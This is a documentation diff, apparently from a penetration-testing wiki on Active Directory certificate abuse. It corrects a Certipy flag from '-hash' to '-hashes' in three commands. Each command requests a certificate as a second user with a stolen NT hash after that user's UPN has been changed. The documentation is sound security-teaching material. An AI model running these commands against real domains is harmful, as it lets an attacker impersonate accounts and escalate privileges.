@@ -282,7 +282,7 @@ certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn
 The vulnerable certificate can be requested as user2.
 
 ```bash
-certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
+certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
 ```
 
 The user2's UPN is changed back to something else.
@@ -381,7 +381,7 @@ certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn
 A certificate permitting client authentication can be requested as user2.
 
 ```bash
-certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
+certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -ca 'ca_name' -template 'User'
 ```
 
 The user2's UPN is changed back to something else.
@@ -476,7 +476,7 @@ certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn
 A certificate permitting client authentication can be requested as user2.
 
 ```bash
-certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
+certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -ca 'ca_name' -template 'User'
 ```
 
 The user2's UPN is changed back to something else.
